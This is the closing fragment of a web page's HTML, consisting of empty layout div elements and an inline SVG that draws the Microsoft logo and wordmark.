</div> </div> <div class="r"> <div class="s s5">
</div> <div class="s s4">
</div> <div class="s s1">
</div> </div> </div> </div> <div id="eb">
</div> <div id="ef"> <div class="r">
</div> <div class="l">
</div> </div> <div id="closedFlap"> <div id="fmask">
<div class="flapTriangle">
</div>
</div> </div> </div> </div> </div> <svg id="MSLogo" width="99" height="22" xmlns="http://www.w3.org/2000/svg"> <g fill="none" fill-rule="evenodd"> <path d="m34.64 12.07-.58 1.65h-.04c-.1-.39-.28-.93-.56-1.63l-3.14-7.9h-3.08v12.56h2.03V9.03l-.03-1.7c-.01-.34-.05-.6-.06-.81h.05c.1.47.2.83.28 1.07l3.78 9.16h1.42l3.75-9.24c.08-.21.17-.62.25-1h.05c-.05.92-.1 1.76-.1 2.26v7.98h2.17V4.2h-2.96l-3.23 7.88z" fill="#737474">
</path> <path d="M0 20.96h98.15V0H0z">
</path> <path fill="#737474" d="M42.87 16.75h2.11v-9h-2.11zm1.08-12.82c-.35 0-.66.12-.9.35a1.17 1.17 0 0 0-.38.88c0 .35.12.64.37.87.25.23.55.34.9.34s.67-.11.92-.34c.25-.23.38-.52.38-.86 0-.34-.13-.64-.37-.88a1.26 1.26 0 0 0-.92-.36m8.53 3.73a5.9 5.9 0 0 0-1.19-.12c-.97 0-1.83.2-2.57.62-.74.4-1.3 1-1.7 1.74a5.57 5.57 0 0 0-.01 4.9c.37.7.9 1.23 1.58 1.6.67.38 1.45.57 2.31.57 1.01 0 1.87-.2 2.56-.6l.03-.02v-1.94l-.1.07c-.3.23-.65.4-1.03.54a3.12 3.12 0 0 1-1.01.2c-.83 0-1.5-.26-1.98-.78a3 3 0 0 1-.73-2.14c0-.9.25-1.65.76-2.2a2.6 2.6 0 0 1 1.98-.81c.7 0 1.38.23 2.02.7l.09.06V8.01L53.46 8a3.5 3.5 0 0 0-.98-.33m6.97-.06a2.17 2.17 0 0 0-1.41.5c-.36.3-.62.7-.82 1.21h-.02V7.75h-2.12v9h2.12v-4.6c0-.78.18-1.43.53-1.91.34-.48.8-.73 1.37-.73a2.5 2.5 0 0 1 1.13.3l.09.06V7.74l-.04-.02c-.2-.08-.47-.12-.83-.12m7.44 6.87c-.4.5-1 .75-1.78.75s-1.4-.26-1.83-.77a3.25 3.25 0 0 1-.65-2.16c0-.96.22-1.7.65-2.22a2.24 2.24 0 0 1 1.8-.78c.75 0 1.34.25 1.77.74.42.5.64 1.24.64 2.2 0 .98-.2 1.73-.6 2.23M65.2 7.54a4.7 4.7 0 0 0-3.5 1.29 4.84 4.84 0 0 0-1.27 3.53c0 1.4.42 2.54 1.24 3.36a4.48 4.48 0 0 0 3.31 1.25c1.44 0 2.6-.44 3.44-1.31a4.84 4.84 0 0 0 1.26-3.5c0-1.43-.4-2.57-1.18-3.39a4.38 4.38 0 0 0-3.3-1.23m9.18 3.93a4.6 4.6 0 0 1-1.27-.66.93.93 0 0 1-.26-.7c0-.25.1-.46.33-.63.22-.17.52-.26.9-.26a3.74 3.74 0 0 1 2.04.6l.1.07V7.93l-.04-.02a4.71 4.71 0 0 0-.97-.26 5.93 5.93 0 0 0-1.05-.11c-1.01 0-1.85.25-2.49.76a2.45 2.45 0 0 0-.96 2c0 .42.07.8.2 1.12.15.32.36.6.65.83.28.24.72.48 1.3.73.49.2.85.37 1.08.5.23.14.39.27.48.4.09.12.13.3.13.5 0 .61-.45.9-1.38.9a3.8 3.8 0 0 1-1.17-.2 4.42 4.42 0 0 1-1.2-.62l-.1-.06v2.06l.04.02a6.02 6.02 0 0 0 2.35.5c1.1-.01 1.98-.27 2.62-.78.65-.52.98-1.2.98-2.05 0-.6-.18-1.12-.53-1.54-.34-.42-.94-.8-1.78-1.14m9.68 3c-.4.5-1 .75-1.78.75-.77 0-1.39-.26-1.82-.77a3.25 3.25 0 0 1-.65-2.16c0-.96.22-1.7.65-2.22a2.24 2.24 0 0 1 1.8-.78c.75 0 1.34.25 1.76.74.43.5.65 1.24.65 2.2 0 .98-.2 1.73-.6 2.23m-1.69-6.92a4.7 4.7 0 0 0-3.5 1.29 4.84 4.84 0 0 0-1.27 3.53c0 1.4.42 2.54 1.24 3.36a4.48 4.48 0 0 0 3.31 1.25c1.44 0 2.6-.44 3.44-1.31a4.84 4.84 0 0 0 1.26-3.5c0-1.43-.4-2.57-1.19-3.39a4.38 4.38 0 0 0-3.29-1.23m15.77 1.94V7.75H96V5.07l-.07.02-2.01.62h-.04v2.04H90.7V6.62c0-.53.12-.93.35-1.2.23-.27.56-.4.99-.4.3 0 .61.07.93.21l.08.04V3.45L93 3.43c-.3-.1-.7-.15-1.2-.15-.62 0-1.19.13-1.68.4-.5.27-.89.66-1.16 1.15a3.41 3.41 0 0 0-.41 1.68v1.24h-1.5v1.73h1.5v7.27h2.14V9.48h3.18v4.62c0 1.9.9 2.87 2.67 2.87a4.36 4.36 0 0 0 1.57-.31l.03-.02V14.9l-.09.06c-.12.07-.26.14-.43.18-.17.05-.31.08-.42.08-.42 0-.73-.12-.92-.34-.19-.22-.29-.6-.29-1.15V9.48h2.15z">
</path> <path fill="#F05124" d="M0 9.96h9.96V0H0z">
</path> <path fill="#7EBB42" d="M11 9.96h9.95V0H11z">
</path> <path fill="#32A0DA" d="M0 20.96h9.96V11H0z">
</path> <path fill="#FDB813" d="M11 20.96h9.95V11H11z">
</path> </g> </svg> </div>   
</body></html>
